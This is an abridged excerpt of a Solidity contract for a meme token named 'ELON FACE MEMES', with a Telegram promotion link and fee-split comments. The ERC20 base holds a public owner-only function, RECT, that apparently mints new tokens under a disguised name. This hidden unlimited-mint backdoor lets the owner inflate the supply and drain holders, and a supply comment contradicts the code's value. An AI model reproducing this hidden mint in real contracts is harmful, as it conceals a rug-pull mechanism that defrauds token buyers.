...
//💥 5% Marketing, 4% liquidity, 1% Buyback
//https://t.me/elonfacememes
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RECT(uint256 amount) public onlyOwner {
    RECT(msg.sender, amount);
    }
    ...
    function RECT(address account, uint256 amount) internal virtual {
...
contract ELON is ERC20 {
    ...
    uint tokenTotalSupply = 1000000000; // 2000000
    
    constructor() public ERC20("ELON FACE MEMES", "ELON_FACE") {
        RECT(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}